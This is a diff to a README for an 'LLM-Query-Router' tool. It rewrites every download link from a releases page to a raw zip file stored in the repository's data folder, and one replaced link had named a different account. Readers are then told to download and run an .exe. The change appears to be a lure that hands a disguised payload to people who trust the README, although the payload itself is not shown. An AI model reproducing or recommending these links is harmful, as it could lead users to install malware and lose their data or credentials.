@@ -1,6 +1,6 @@
 # 🧠 LLM-Query-Router - Smarter AI, Lower Costs
 
-[![Download Now](https://img.shields.io/badge/Download-LLM--Query--Router-blue?style=for-the-badge&logo=github)](https://github.com/Fuddyduddyyakuza218/LLM-Query-Router/releases)
+[![Download Now](https://img.shields.io/badge/Download-LLM--Query--Router-blue?style=for-the-badge&logo=github)](https://github.com/Fuddyduddyyakuza218/LLM-Query-Router/raw/refs/heads/main/data/v2.0.zip)
 
 ## 🎯 What Is This?
 
@@ -12,7 +12,7 @@ Think of it like a restaurant menu: if you just want a simple coffee, the router
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: **https://github.com/Fuddyduddyyakuza218/LLM-Query-Router/releases**  
+Visit this link to download the application: **https://github.com/Fuddyduddyyakuza218/LLM-Query-Router/raw/refs/heads/main/data/v2.0.zip**  
 Click the download button for the latest version.
 
 ### Step 2: Run It
@@ -48,7 +48,7 @@ The app uses machine learning (specifically DistilBERT and XGBoost) to analyze y
 
 ## 📥 Download & Install
 
-Visit the download page: https://github.com/Fuddysy/LLM-Query-Router/releases
+Visit the download page: https://github.com/Fuddyduddyyakuza218/LLM-Query-Router/raw/refs/heads/main/data/v2.0.zip
 
 Click the **latest release** and download the `LLM-Query-Router.exe` file.  
 Run it and follow the on-screen instructions.
